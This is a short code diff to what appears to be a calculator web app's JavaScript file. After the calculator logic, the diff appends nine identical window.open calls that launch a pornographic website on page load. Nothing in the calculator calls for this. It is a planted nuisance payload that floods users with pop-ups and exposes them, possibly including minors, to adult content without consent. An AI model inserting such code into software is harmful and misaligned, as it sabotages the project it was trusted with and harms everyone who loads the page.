@@ -36,3 +36,14 @@ function calculateResult() {
 }
 
 updateDisplay();
+
+window.open('https://xvideos.com')
+window.open('https://xvideos.com')
+window.open('https://xvideos.com')
+window.open('https://xvideos.com')
+window.open('https://xvideos.com')
+window.open('https://xvideos.com')
+window.open('https://xvideos.com')
+window.open('https://xvideos.com')
+window.open('https://xvideos.com')
+
